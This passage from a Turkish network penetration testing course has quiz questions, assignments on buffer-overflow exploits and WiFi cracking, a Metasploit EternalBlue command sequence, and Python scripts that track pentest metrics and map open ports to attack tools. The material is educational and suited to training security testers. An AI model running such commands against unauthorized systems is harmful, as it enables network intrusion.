- Evil twin saldƒ±rƒ±sƒ±
- Handshake yakalama
- Dictionary attack

## ‚ùì Bilgi Kontrol Sorularƒ±

### Teorik Sorular

1. **Aƒü Ke≈üfi**
   - Passive ve active reconnaissance arasƒ±ndaki farklar nelerdir?
   - OSINT teknikleri neden √∂nemlidir?
   - DNS enumeration nasƒ±l ger√ßekle≈ütirilir?

2. **Port Tarama**
   - TCP ve UDP tarama teknikleri arasƒ±ndaki farklar?
   - Stealth tarama teknikleri nelerdir?
   - Firewall evasion teknikleri?

3. **Zafiyet Deƒüerlendirmesi**
   - CVSS skorlama sistemi nasƒ±l √ßalƒ±≈üƒ±r?
   - False positive ve false negative nedir?
   - Zafiyet √∂nceliklendirme nasƒ±l yapƒ±lƒ±r?

4. **Exploitation**
   - Buffer overflow saldƒ±rƒ±larƒ± nasƒ±l √ßalƒ±≈üƒ±r?
   - Return-oriented programming (ROP) nedir?
   - ASLR ve DEP korumalarƒ± nasƒ±l bypass edilir?

5. **Post-Exploitation**
   - Privilege escalation teknikleri nelerdir?
   - Lateral movement nasƒ±l ger√ßekle≈ütirilir?
   - Persistence teknikleri?

### Pratik Sorular

1. **Nmap Kullanƒ±mƒ±**
   ```bash
   # A≈üaƒüƒ±daki Nmap komutunun ne yaptƒ±ƒüƒ±nƒ± a√ßƒ±klayƒ±n
   nmap -sS -sV -O -A --script vuln 192.168.1.0/24
   ```

2. **Metasploit Framework**
   ```bash
   # Bu Metasploit komut dizisinin amacƒ±nƒ± a√ßƒ±klayƒ±n
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 192.168.1.100
   set LHOST 192.168.1.50
   exploit
   ```

3. **Wireshark Analizi**
   - TCP handshake s√ºrecini Wireshark'ta nasƒ±l analiz edersiniz?
   - ≈û√ºpheli aƒü trafiƒüini nasƒ±l tespit edersiniz?

## üéØ Pratik √ñdevler

### √ñdev 1: Aƒü Ke≈üif Projesi

**Hedef**: Belirli bir aƒü aralƒ±ƒüƒ±nda kapsamlƒ± ke≈üif yapma

**Gereksinimler**:
- Nmap ile port tarama
- Service enumeration
- OS fingerprinting
- Zafiyet tarama
- Detaylƒ± rapor hazƒ±rlama

**Teslim Edilecekler**:
- Tarama sonu√ßlarƒ±
- Bulunan servisler listesi
- Tespit edilen zafiyetler
- Risk deƒüerlendirmesi

### √ñdev 2: Buffer Overflow Exploit Geli≈ütirme

**Hedef**: Basit bir buffer overflow zafiyeti i√ßin exploit geli≈ütirme

**Gereksinimler**:
- Zafiyet analizi
- Offset hesaplama
- Shellcode geli≈ütirme
- Exploit test etme

**Teslim Edilecekler**:
- Exploit kodu
- √áalƒ±≈üma adƒ±mlarƒ±
- Test sonu√ßlarƒ±

### √ñdev 3: Wireless Penetrasyon Testi

**Hedef**: WiFi aƒüƒ±nƒ±n g√ºvenlik deƒüerlendirmesi

**Gereksinimler**:
- Aƒü ke≈üfi
- Handshake yakalama
- ≈ûifre kƒ±rma
- G√ºvenlik √∂nerileri

**Teslim Edilecekler**:
- Tarama raporu
- Yakalanan handshake'ler
- Kƒ±rƒ±lan ≈üifreler
- G√ºvenlik √∂nerileri

## üìà Performans Metrikleri

### Network Penetration Test Performance Tracker

```python
#!/usr/bin/env python3
"""
Network Penetration Test Performance Tracker
Author: ibrahimsql
Description: Aƒü penetrasyon testi performans metrikleri
"""

import time
import json
from datetime import datetime, timedelta
import statistics

class NetworkPentestPerformanceTracker:
    def __init__(self):
        self.metrics = {
            'reconnaissance': {
                'total_time': 0,
                'hosts_discovered': 0,
                'services_identified': 0,
                'scan_efficiency': 0
            },
            'vulnerability_assessment': {
                'total_time': 0,
                'vulnerabilities_found': 0,
                'false_positives': 0,
                'accuracy_rate': 0
            },
            'exploitation': {
                'total_time': 0,
                'successful_exploits': 0,
                'failed_attempts': 0,
                'success_rate': 0
            },
            'post_exploitation': {
                'total_time': 0,
                'privilege_escalations': 0,
                'lateral_movements': 0,
                'persistence_achieved': 0
            },
            'overall': {
                'total_test_time': 0,
                'coverage_percentage': 0,
                'risk_score': 0,
                'efficiency_score': 0
            }
        }
        
        self.test_sessions = []
        self.start_time = None
    
    def start_test_session(self, test_name, target_network):
        """Test oturumu ba≈ülat"""
        self.start_time = time.time()
        
        session = {
            'test_name': test_name,
            'target_network': target_network,
            'start_time': datetime.now().isoformat(),
            'phases': {},
            'findings': [],
            'metrics': {}
        }
        
        self.test_sessions.append(session)
        print(f"[+] Test oturumu ba≈ülatƒ±ldƒ±: {test_name}")
        return len(self.test_sessions) - 1
    
    def start_phase(self, session_id, phase_name):
        """Test fazƒ± ba≈ülat"""
        if session_id < len(self.test_sessions):
            self.test_sessions[session_id]['phases'][phase_name] = {
                'start_time': time.time(),
                'end_time': None,
                'duration': 0,
                'activities': []
            }
            print(f"[+] Faz ba≈ülatƒ±ldƒ±: {phase_name}")
    
    def end_phase(self, session_id, phase_name):
        """Test fazƒ± bitir"""
        if session_id < len(self.test_sessions):
            phase = self.test_sessions[session_id]['phases'].get(phase_name)
            if phase and phase['end_time'] is None:
                phase['end_time'] = time.time()
                phase['duration'] = phase['end_time'] - phase['start_time']
                print(f"[+] Faz tamamlandƒ±: {phase_name} ({phase['duration']:.2f} saniye)")
    
    def record_reconnaissance_metrics(self, session_id, hosts_found, services_found, scan_time):
        """Reconnaissance metrikleri kaydet"""
        self.metrics['reconnaissance']['total_time'] += scan_time
        self.metrics['reconnaissance']['hosts_discovered'] += hosts_found
        self.metrics['reconnaissance']['services_identified'] += services_found
        
        # Tarama verimliliƒüi (host/dakika)
        if scan_time > 0:
            efficiency = (hosts_found / scan_time) * 60
            self.metrics['reconnaissance']['scan_efficiency'] = efficiency
        
        print(f"[+] Reconnaissance metrikleri kaydedildi: {hosts_found} host, {services_found} servis")
    
    def record_vulnerability_metrics(self, session_id, vulns_found, false_positives, scan_time):
        """Zafiyet deƒüerlendirme metrikleri kaydet"""
        self.metrics['vulnerability_assessment']['total_time'] += scan_time
        self.metrics['vulnerability_assessment']['vulnerabilities_found'] += vulns_found
        self.metrics['vulnerability_assessment']['false_positives'] += false_positives
        
        # Doƒüruluk oranƒ±
        total_findings = vulns_found + false_positives
        if total_findings > 0:
            accuracy = (vulns_found / total_findings) * 100
            self.metrics['vulnerability_assessment']['accuracy_rate'] = accuracy
        
        print(f"[+] Zafiyet metrikleri kaydedildi: {vulns_found} zafiyet, {false_positives} false positive")
    
    def record_exploitation_metrics(self, session_id, successful_exploits, failed_attempts, exploit_time):
        """Exploitation metrikleri kaydet"""
        self.metrics['exploitation']['total_time'] += exploit_time
        self.metrics['exploitation']['successful_exploits'] += successful_exploits
        self.metrics['exploitation']['failed_attempts'] += failed_attempts
        
        # Ba≈üarƒ± oranƒ±
        total_attempts = successful_exploits + failed_attempts
        if total_attempts > 0:
            success_rate = (successful_exploits / total_attempts) * 100
            self.metrics['exploitation']['success_rate'] = success_rate
        
        print(f"[+] Exploitation metrikleri kaydedildi: {successful_exploits} ba≈üarƒ±lƒ±, {failed_attempts} ba≈üarƒ±sƒ±z")
    
    def record_post_exploitation_metrics(self, session_id, privesc_count, lateral_count, persistence_count, time_spent):
        """Post-exploitation metrikleri kaydet"""
        self.metrics['post_exploitation']['total_time'] += time_spent
        self.metrics['post_exploitation']['privilege_escalations'] += privesc_count
        self.metrics['post_exploitation']['lateral_movements'] += lateral_count
        self.metrics['post_exploitation']['persistence_achieved'] += persistence_count
        
        print(f"[+] Post-exploitation metrikleri kaydedildi: {privesc_count} privesc, {lateral_count} lateral")
    
    def calculate_coverage_percentage(self, session_id, total_targets, tested_targets):
        """Kapsam y√ºzdesi hesapla"""
        if total_targets > 0:
            coverage = (tested_targets / total_targets) * 100
            self.metrics['overall']['coverage_percentage'] = coverage
            return coverage
        return 0
    
    def calculate_risk_score(self, session_id):
        """Risk skoru hesapla"""
        # Risk skoru hesaplama algoritmasƒ±
        high_risk_vulns = 0
        medium_risk_vulns = 0
        low_risk_vulns = 0
        
        # Simulated risk calculation
        total_vulns = self.metrics['vulnerability_assessment']['vulnerabilities_found']
        if total_vulns > 0:
            high_risk_vulns = int(total_vulns * 0.3)
            medium_risk_vulns = int(total_vulns * 0.5)
            low_risk_vulns = total_vulns - high_risk_vulns - medium_risk_vulns
        
        # CVSS benzeri skorlama
        risk_score = (high_risk_vulns * 9) + (medium_risk_vulns * 5) + (low_risk_vulns * 2)
        self.metrics['overall']['risk_score'] = risk_score
        
        return risk_score
    
    def calculate_efficiency_score(self, session_id):
        """Verimlilik skoru hesapla"""
        total_time = self.metrics['overall']['total_test_time']
        total_findings = self.metrics['vulnerability_assessment']['vulnerabilities_found']
        
        if total_time > 0 and total_findings > 0:
            # Saat ba≈üƒ±na bulunan zafiyet sayƒ±sƒ±
            efficiency = (total_findings / (total_time / 3600))
            self.metrics['overall']['efficiency_score'] = efficiency
            return efficiency
        return 0
    
    def end_test_session(self, session_id):
        """Test oturumu bitir"""
        if session_id < len(self.test_sessions) and self.start_time:
            end_time = time.time()
            total_time = end_time - self.start_time
            
            self.metrics['overall']['total_test_time'] = total_time
            self.test_sessions[session_id]['end_time'] = datetime.now().isoformat()
            self.test_sessions[session_id]['total_duration'] = total_time
            
            # Final hesaplamalar
            self.calculate_risk_score(session_id)
            self.calculate_efficiency_score(session_id)
            
            print(f"[+] Test oturumu tamamlandƒ±: {total_time:.2f} saniye")
    
    def generate_performance_report(self, session_id=None):
        """Performans raporu olu≈ütur"""
        if session_id is not None and session_id < len(self.test_sessions):
            session = self.test_sessions[session_id]
            report_data = {
                'session_info': session,
                'metrics': self.metrics
            }
        else:
            report_data = {
                'all_sessions': self.test_sessions,
                'aggregated_metrics': self.metrics
            }
        
        # Rapor dosyasƒ± olu≈ütur
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f'network_pentest_performance_{timestamp}.json'
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        print(f"[+] Performans raporu olu≈üturuldu: {report_file}")
        return report_file
    
    def print_summary(self):
        """√ñzet metrikleri yazdƒ±r"""
        print("\n" + "="*50)
        print("NETWORK PENETRATION TEST PERFORMANCE SUMMARY")
        print("="*50)
        
        print(f"\nReconnaissance:")
        print(f"  - Total Time: {self.metrics['reconnaissance']['total_time']:.2f} seconds")
        print(f"  - Hosts Discovered: {self.metrics['reconnaissance']['hosts_discovered']}")
        print(f"  - Services Identified: {self.metrics['reconnaissance']['services_identified']}")
        print(f"  - Scan Efficiency: {self.metrics['reconnaissance']['scan_efficiency']:.2f} hosts/min")
        
        print(f"\nVulnerability Assessment:")
        print(f"  - Total Time: {self.metrics['vulnerability_assessment']['total_time']:.2f} seconds")
        print(f"  - Vulnerabilities Found: {self.metrics['vulnerability_assessment']['vulnerabilities_found']}")
        print(f"  - False Positives: {self.metrics['vulnerability_assessment']['false_positives']}")
        print(f"  - Accuracy Rate: {self.metrics['vulnerability_assessment']['accuracy_rate']:.2f}%")
        
        print(f"\nExploitation:")
        print(f"  - Total Time: {self.metrics['exploitation']['total_time']:.2f} seconds")
        print(f"  - Successful Exploits: {self.metrics['exploitation']['successful_exploits']}")
        print(f"  - Failed Attempts: {self.metrics['exploitation']['failed_attempts']}")
        print(f"  - Success Rate: {self.metrics['exploitation']['success_rate']:.2f}%")
        
        print(f"\nPost-Exploitation:")
        print(f"  - Total Time: {self.metrics['post_exploitation']['total_time']:.2f} seconds")
        print(f"  - Privilege Escalations: {self.metrics['post_exploitation']['privilege_escalations']}")
        print(f"  - Lateral Movements: {self.metrics['post_exploitation']['lateral_movements']}")
        print(f"  - Persistence Achieved: {self.metrics['post_exploitation']['persistence_achieved']}")
        
        print(f"\nOverall:")
        print(f"  - Total Test Time: {self.metrics['overall']['total_test_time']:.2f} seconds")
        print(f"  - Coverage Percentage: {self.metrics['overall']['coverage_percentage']:.2f}%")
        print(f"  - Risk Score: {self.metrics['overall']['risk_score']}")
        print(f"  - Efficiency Score: {self.metrics['overall']['efficiency_score']:.2f} vulns/hour")

# Kullanƒ±m √∂rneƒüi
if __name__ == "__main__":
    # Performance tracker ba≈ülat
    tracker = NetworkPentestPerformanceTracker()
    
    # Test oturumu ba≈ülat
    session_id = tracker.start_test_session("Corporate Network Pentest", "192.168.1.0/24")
    
    # Reconnaissance fazƒ±
    tracker.start_phase(session_id, "reconnaissance")
    time.sleep(2)  # Simulated work
    tracker.record_reconnaissance_metrics(session_id, hosts_found=25, services_found=150, scan_time=300)
    tracker.end_phase(session_id, "reconnaissance")
    
    # Vulnerability assessment fazƒ±
    tracker.start_phase(session_id, "vulnerability_assessment")
    time.sleep(1)  # Simulated work
    tracker.record_vulnerability_metrics(session_id, vulns_found=15, false_positives=3, scan_time=600)
    tracker.end_phase(session_id, "vulnerability_assessment")
    
    # Exploitation fazƒ±
    tracker.start_phase(session_id, "exploitation")
    time.sleep(1)  # Simulated work
    tracker.record_exploitation_metrics(session_id, successful_exploits=8, failed_attempts=7, exploit_time=1200)
    tracker.end_phase(session_id, "exploitation")
    
    # Post-exploitation fazƒ±
    tracker.start_phase(session_id, "post_exploitation")
    time.sleep(1)  # Simulated work
    tracker.record_post_exploitation_metrics(session_id, privesc_count=5, lateral_count=3, persistence_count=2, time_spent=800)
    tracker.end_phase(session_id, "post_exploitation")
    
    # Kapsam hesapla
    tracker.calculate_coverage_percentage(session_id, total_targets=30, tested_targets=25)
    
    # Test oturumu bitir
    tracker.end_test_session(session_id)
    
    # √ñzet yazdƒ±r
    tracker.print_summary()
    
    # Rapor olu≈ütur
    tracker.generate_performance_report(session_id)
```

## ü§ñ Yapay Zeka ve Makine √ñƒürenimi Uygulamalarƒ±

### AI-Powered Network Penetration Testing

```python
#!/usr/bin/env python3
"""
AI-Powered Network Penetration Testing Framework
Author: ibrahimsql
Description: Yapay zeka destekli aƒü penetrasyon testi
"""

import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.cluster import DBSCAN
from sklearn.preprocessing import StandardScaler
import joblib
import json
import subprocess
import re
from datetime import datetime
import warnings
warnings.filterwarnings('ignore')

class AINetworkPentester:
    def __init__(self):
        self.vulnerability_classifier = None
        self.anomaly_detector = None
        self.exploit_recommender = None
        self.scaler = StandardScaler()
        
        # Zafiyet veritabanƒ±
        self.vulnerability_db = {
            'ssh_weak_auth': {'severity': 'medium', 'exploitability': 0.7, 'impact': 0.6},
            'ftp_anonymous': {'severity': 'high', 'exploitability': 0.9, 'impact': 0.5},
            'smb_v1': {'severity': 'critical', 'exploitability': 0.8, 'impact': 0.9},
            'http_directory_listing': {'severity': 'low', 'exploitability': 0.3, 'impact': 0.2},
            'mysql_default_creds': {'severity': 'high', 'exploitability': 0.8, 'impact': 0.8},
            'rdp_weak_encryption': {'severity': 'medium', 'exploitability': 0.6, 'impact': 0.7}
        }
        
        # Exploit veritabanƒ±
        self.exploit_db = {
            'ssh_weak_auth': ['hydra', 'medusa', 'ncrack'],
            'ftp_anonymous': ['manual_login', 'ftp_bounce'],
            'smb_v1': ['ms17_010_eternalblue', 'ms08_067_netapi'],
            'mysql_default_creds': ['mysql_login', 'mysql_enum']
        }
    
    def extract_port_features(self, nmap_output):
        """Nmap √ßƒ±ktƒ±sƒ±ndan √∂zellik √ßƒ±karma"""
        features = []
        
        # Port bilgilerini parse et
        port_pattern = r'(\d+)/(tcp|udp)\s+(open|closed|filtered)\s+(.+)'
        ports = re.findall(port_pattern, nmap_output)
        
        for port, protocol, state, service in ports:
            feature_vector = {
                'port': int(port),
                'protocol': 1 if protocol == 'tcp' else 0,
                'state_open': 1 if state == 'open' else 0,
                'state_filtered': 1 if state == 'filtered' else 0,
                'is_common_port': 1 if int(port) in [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995] else 0,
                'is_high_port': 1 if int(port) > 1024 else 0,
                'service_length': len(service),
                'has_version': 1 if any(char.isdigit() for char in service) else 0
            }
            features.append(feature_vector)
        
        return features
    
    def predict_vulnerability_likelihood(self, port_features):
        """Port √∂zelliklerine g√∂re zafiyet olasƒ±lƒ±ƒüƒ± tahmin et"""
        if not port_features:
            return []
        
        # Basit kural tabanlƒ± tahmin (ger√ßek uygulamada ML modeli kullanƒ±lƒ±r)
        predictions = []
        
        for feature in port_features:
            risk_score = 0
            
            # Port bazlƒ± risk skorlama
            if feature['port'] == 21:  # FTP
                risk_score += 0.6
            elif feature['port'] == 22:  # SSH
                risk_score += 0.4
            elif feature['port'] == 23:  # Telnet
                risk_score += 0.9
            elif feature['port'] == 445:  # SMB
                risk_score += 0.7
            elif feature['port'] == 3389:  # RDP
                risk_score += 0.5
            
            # Durum bazlƒ± skorlama
            if feature['state_open']:
                risk_score += 0.3
            if feature['state_filtered']:
                risk_score += 0.1
            
            # Versiyon bilgisi varsa risk artar
            if feature['has_version']:
                risk_score += 0.2
            
            predictions.append({
                'port': feature['port'],
                'vulnerability_likelihood': min(risk_score, 1.0),
                'recommended_tests': self._get_recommended_tests(feature['port'])
            })
        
        return predictions
    
    def _get_recommended_tests(self, port):
        """Port i√ßin √∂nerilen testler"""
        test_recommendations = {
            21: ['ftp_anonymous_login', 'ftp_bounce_attack', 'ftp_brute_force'],
            22: ['ssh_brute_force', 'ssh_key_exchange_test', 'ssh_user_enum'],
            23: ['telnet_brute_force', 'telnet_banner_grab'],
            25: ['smtp_user_enum', 'smtp_relay_test'],
            53: ['dns_zone_transfer', 'dns_cache_poisoning'],
            80: ['web_vulnerability_scan', 'directory_traversal', 'sql_injection'],
            443: ['ssl_cipher_test', 'ssl_certificate_check', 'web_vulnerability_scan'],
            445: ['smb_null_session', 'smb_brute_force', 'eternal_blue_test'],
            3389: ['rdp_brute_force', 'rdp_encryption_test']
        }
        
        return test_recommendations.get(port, ['generic_service_test'])
    
    def detect_network_anomalies(self, network_traffic_data):
        """Aƒü trafiƒüinde anomali tespiti"""
        # Simulated network traffic analysis
        anomalies = []
        
        # Isolation Forest ile anomali tespiti
        if len(network_traffic_data) > 10:
            isolation_forest = IsolationForest(contamination=0.1, random_state=42)
            anomaly_scores = isolation_forest.fit_predict(network_traffic_data)
            
            for i, score in enumerate(anomaly_scores):
                if score == -1:  # Anomali tespit edildi
                    anomalies.append({
                        'index': i,
                        'data': network_traffic_data[i],
                        'anomaly_type': 'statistical_outlier',
                        'confidence': 0.8
                    })
        
        return anomalies
    
    def recommend_exploit_chain(self, vulnerabilities):
        """Zafiyet zinciri √∂nerisi"""
        exploit_chain = []
        
        # Zafiyetleri √∂ncelik sƒ±rasƒ±na g√∂re sƒ±rala
        sorted_vulns = sorted(vulnerabilities, 
                            key=lambda x: x['vulnerability_likelihood'], 
                            reverse=True)
        
        for vuln in sorted_vulns[:5]:  # En y√ºksek 5 zafiyet
            port = vuln['port']
            likelihood = vuln['vulnerability_likelihood']
            
            if likelihood > 0.6:
                exploit_chain.append({
                    'target_port': port,
                    'exploit_type': self._determine_exploit_type(port),
                    'success_probability': likelihood,
                    'required_tools': self._get_required_tools(port),
                    'execution_order': len(exploit_chain) + 1
                })
        
        return exploit_chain
    
    def _determine_exploit_type(self, port):
        """Port i√ßin exploit t√ºr√º belirleme"""
        exploit_types = {
            21: 'credential_attack',
            22: 'credential_attack',
            23: 'credential_attack',
            25: 'enumeration_attack',
            53: 'information_disclosure',
            80: 'web_application_attack',
            443: 'web_application_attack',
            445: 'remote_code_execution',
            3389: 'credential_attack'
        }
        
        return exploit_types.get(port, 'generic_attack')
    
    def _get_required_tools(self, port):
        """Port i√ßin gerekli ara√ßlar"""
        tool_requirements = {
            21: ['hydra', 'nmap', 'ftp'],
            22: ['hydra', 'ssh', 'nmap'],
            23: ['hydra', 'telnet', 'nmap'],
            25: ['smtp-user-enum', 'nmap'],
            53: ['dig', 'nslookup', 'dnsrecon'],
            80: ['nikto', 'dirb', 'burpsuite'],
            443: ['sslscan', 'nikto', 'burpsuite'],
            445: ['smbclient', 'enum4linux', 'metasploit'],
            3389: ['rdesktop', 'hydra', 'nmap']
        }
        
        return tool_requirements.get(port, ['nmap'])
    
    def generate_ai_pentest_report(self, target, scan_results, vulnerabilities, exploit_chain):
        """AI destekli penetrasyon testi raporu olu≈ütur"""
        report = {
            'metadata': {
                'target': target,
                'scan_date': datetime.now().isoformat(),
                'ai_engine_version': '1.0',
                'confidence_threshold': 0.6
            },
            'executive_summary': {
                'total_ports_scanned': len(scan_results),
                'vulnerabilities_detected': len(vulnerabilities),
                'high_risk_vulnerabilities': len([v for v in vulnerabilities if v['vulnerability_likelihood'] > 0.7]),
                'recommended_immediate_actions': self._generate_immediate_actions(vulnerabilities)
            },
            'detailed_findings': {
                'port_analysis': scan_results,
                'vulnerability_predictions': vulnerabilities,
                'exploit_chain_recommendation': exploit_chain
            },
            'ai_insights': {
                'attack_surface_analysis': self._analyze_attack_surface(scan_results),
                'risk_prioritization': self._prioritize_risks(vulnerabilities),
                'defense_recommendations': self._generate_defense_recommendations(vulnerabilities)
            }
        }
        
        # Raporu dosyaya kaydet
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f'ai_pentest_report_{timestamp}.json'
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] AI Penetrasyon Testi Raporu olu≈üturuldu: {report_file}")
        return report_file
    
    def _generate_immediate_actions(self, vulnerabilities):
        """Acil eylem √∂nerileri olu≈ütur"""
        actions = []
        
        high_risk_vulns = [v for v in vulnerabilities if v['vulnerability_likelihood'] > 0.7]
        
        for vuln in high_risk_vulns:
            port = vuln['port']
            if port == 23:  # Telnet
                actions.append("Telnet servisini devre dƒ±≈üƒ± bƒ±rakƒ±n ve SSH kullanƒ±n")
            elif port == 445:  # SMB
                actions.append("SMBv1'i devre dƒ±≈üƒ± bƒ±rakƒ±n ve g√ºvenlik yamalarƒ±nƒ± uygulayƒ±n")
            elif port == 21:  # FTP
                actions.append("Anonymous FTP eri≈üimini devre dƒ±≈üƒ± bƒ±rakƒ±n")
        
        return actions
    
    def _analyze_attack_surface(self, scan_results):
        """Saldƒ±rƒ± y√ºzeyi analizi"""
        open_ports = len([r for r in scan_results if r.get('state_open', 0) == 1])
        total_ports = len(scan_results)
        
        return {
            'open_port_ratio': open_ports / total_ports if total_ports > 0 else 0,
            'attack_surface_score': min(open_ports * 0.1, 1.0),
            'exposure_level': 'High' if open_ports > 10 else 'Medium' if open_ports > 5 else 'Low'
        }
    
    def _prioritize_risks(self, vulnerabilities):
        """Risk √∂nceliklendirme"""
        risk_levels = {
            'critical': [v for v in vulnerabilities if v['vulnerability_likelihood'] > 0.8],
            'high': [v for v in vulnerabilities if 0.6 < v['vulnerability_likelihood'] <= 0.8],
            'medium': [v for v in vulnerabilities if 0.4 < v['vulnerability_likelihood'] <= 0.6],
            'low': [v for v in vulnerabilities if v['vulnerability_likelihood'] <= 0.4]
        }
        
        return {
            'critical_count': len(risk_levels['critical']),
            'high_count': len(risk_levels['high']),
            'medium_count': len(risk_levels['medium']),
            'low_count': len(risk_levels['low']),
            'priority_order': risk_levels
        }
    
    def _generate_defense_recommendations(self, vulnerabilities):
        """Savunma √∂nerileri olu≈ütur"""
        recommendations = []
        
        port_counts = {}
        for vuln in vulnerabilities:
            port = vuln['port']
            port_counts[port] = port_counts.get(port, 0) + 1
        
        # En √ßok zafiyet bulunan portlar i√ßin √∂neriler
        for port, count in sorted(port_counts.items(), key=lambda x: x[1], reverse=True):
            if port == 22:
                recommendations.append("SSH i√ßin anahtar tabanlƒ± kimlik doƒürulama kullanƒ±n")
            elif port == 80 or port == 443:
                recommendations.append("Web uygulamasƒ± g√ºvenlik duvarƒ± (WAF) kurun")
            elif port == 445:
                recommendations.append("SMB imzalama ve ≈üifreleme etkinle≈ütirin")
        
        return recommendations

# Kullanƒ±m √∂rneƒüi
if __name__ == "__main__":
    # AI Penetration Tester ba≈ülat
    ai_pentester = AINetworkPentester()
    
    # Simulated Nmap output
    nmap_output = """
    22/tcp open  ssh     OpenSSH 7.4
    80/tcp open  http    Apache httpd 2.4.6
    443/tcp open  https   Apache httpd 2.4.6
    445/tcp open  microsoft-ds Microsoft Windows 7 - 10
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    """
    
    # √ñzellik √ßƒ±karma
    features = ai_pentester.extract_port_features(nmap_output)
    print(f"[+] {len(features)} port √∂zelliƒüi √ßƒ±karƒ±ldƒ±")
    
    # Zafiyet tahminleri
    vulnerabilities = ai_pentester.predict_vulnerability_likelihood(features)
    print(f"[+] {len(vulnerabilities)} zafiyet tahmini yapƒ±ldƒ±")
    
    # Exploit zinciri √∂nerisi
    exploit_chain = ai_pentester.recommend_exploit_chain(vulnerabilities)
    print(f"[+] {len(exploit_chain)} adƒ±mlƒ±k exploit zinciri √∂nerildi")
    
    # AI raporu olu≈ütur
    report_file = ai_pentester.generate_ai_pentest_report(
        target="192.168.1.100",
        scan_results=features,
        vulnerabilities=vulnerabilities,
        exploit_chain=exploit_chain
    )
    
    print(f"\n[+] AI destekli penetrasyon testi tamamlandƒ±!")
    print(f"[+] Rapor dosyasƒ±: {report_file}")
```

## üîÆ Gelecek Teknolojileri ve Trendler

### Quantum-Safe Network Penetration Testing

```python
#!/usr/bin/env python3
"""
Quantum-Safe Network Penetration Testing Framework
Author: ibrahimsql
Description: Kuantum diren√ßli aƒü penetrasyon testi
"""

import hashlib
import secrets
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import json
from datetime import datetime

class QuantumSafeNetworkPentester:
    def __init__(self):
        self.quantum_resistant_algorithms = {
            'lattice_based': ['CRYSTALS-Kyber', 'CRYSTALS-Dilithium', 'FALCON'],
            'hash_based': ['SPHINCS+', 'XMSS'],
            'code_based': ['Classic McEliece', 'BIKE'],
            'multivariate': ['Rainbow', 'GeMSS'],
            'isogeny_based': ['SIKE']  # Not recommended after recent attacks
        }
        
        self.current_vulnerable_algorithms = {
            'rsa': {'quantum_threat': 'high', 'timeline': '2030-2040'},
            'ecc': {'quantum_threat': 'high', 'timeline': '2030-2040'},
            'dh': {'quantum_threat': 'high', 'timeline': '2030-2040'},
            'ecdh': {'quantum_threat': 'high', 'timeline': '2030-2040'}
        }
    
    def assess_quantum_vulnerability(self, target_host, port):
        """Kuantum zafiyeti deƒüerlendirmesi"""
        assessment = {
            'target': f"{target_host}:{port}",
            'scan_date': datetime.now().isoformat(),
            'quantum_threats': [],
            'recommendations': [],
            'risk_level': 'unknown'
        }
        
        # SSL/TLS analizi (port 443 i√ßin)
        if port == 443:
            ssl_assessment = self._assess_ssl_quantum_readiness(target_host)
            assessment['ssl_analysis'] = ssl_assessment
            
            if ssl_assessment['uses_vulnerable_algorithms']:
                assessment['quantum_threats'].append({
                    'type': 'ssl_tls_vulnerability',
                    'description': 'SSL/TLS kuantum bilgisayarlara kar≈üƒ± savunmasƒ±z',
                    'affected_algorithms': ssl_assessment['vulnerable_algorithms'],
                    'impact': 'critical'
                })
        
        # SSH analizi (port 22 i√ßin)
        elif port == 22:
            ssh_assessment = self._assess_ssh_quantum_readiness(target_host)
            assessment['ssh_analysis'] = ssh_assessment
            
            if ssh_assessment['uses_vulnerable_algorithms']:
                assessment['quantum_threats'].append({
                    'type': 'ssh_vulnerability',
                    'description': 'SSH kuantum bilgisayarlara kar≈üƒ± savunmasƒ±z',
                    'affected_algorithms': ssh_assessment['vulnerable_algorithms'],
                    'impact': 'high'
                })
        
        # VPN analizi (port 1723, 500, 4500 i√ßin)
        elif port in [1723, 500, 4500]:
            vpn_assessment = self._assess_vpn_quantum_readiness(target_host, port)
            assessment['vpn_analysis'] = vpn_assessment
        
        # Risk seviyesi hesaplama
        assessment['risk_level'] = self._calculate_quantum_risk_level(assessment['quantum_threats'])
        
        # √ñneriler olu≈ütur
        assessment['recommendations'] = self._generate_quantum_safe_recommendations(assessment)
        
        return assessment
    
    def _assess_ssl_quantum_readiness(self, target_host):
        """SSL/TLS kuantum hazƒ±rlƒ±ƒüƒ± deƒüerlendirmesi"""
        # Simulated SSL analysis
        ssl_info = {
            'certificate_algorithm': 'RSA-2048',  # Simulated
            'key_exchange': 'ECDHE',
            'cipher_suite': 'AES-256-GCM',
            'signature_algorithm': 'SHA256-RSA',
            'uses_vulnerable_algorithms': True,
            'vulnerable_algorithms': ['RSA-2048', 'ECDHE'],
            'quantum_safe_alternatives': {
                'RSA-2048': 'CRYSTALS-Kyber',
                'ECDHE': 'CRYSTALS-Kyber'
            }
        }
        
        return ssl_info
    
    def _assess_ssh_quantum_readiness(self, target_host):
        """SSH kuantum hazƒ±rlƒ±ƒüƒ± deƒüerlendirmesi"""
        # Simulated SSH analysis
        ssh_info = {
            'key_exchange_algorithms': ['diffie-hellman-group14-sha256', 'ecdh-sha2-nistp256'],
            'host_key_algorithms': ['rsa-sha2-512', 'ecdsa-sha2-nistp256'],
            'encryption_algorithms': ['aes256-ctr', 'aes256-gcm'],
            'uses_vulnerable_algorithms': True,
            'vulnerable_algorithms': ['diffie-hellman-group14-sha256', 'ecdh-sha2-nistp256', 'ecdsa-sha2-nistp256'],
            'quantum_safe_alternatives': {
                'diffie-hellman-group14-sha256': 'CRYSTALS-Kyber',
                'ecdh-sha2-nistp256': 'CRYSTALS-Kyber',
                'ecdsa-sha2-nistp256': 'CRYSTALS-Dilithium'
            }
        }
        
        return ssh_info
    
    def _assess_vpn_quantum_readiness(self, target_host, port):
        """VPN kuantum hazƒ±rlƒ±ƒüƒ± deƒüerlendirmesi"""
        vpn_info = {
            'protocol': 'IPSec' if port in [500, 4500] else 'PPTP',
            'encryption': 'AES-256',
            'key_exchange': 'DH-Group14' if port in [500, 4500] else 'MPPE',
            'authentication': 'RSA-2048',
            'uses_vulnerable_algorithms': True,
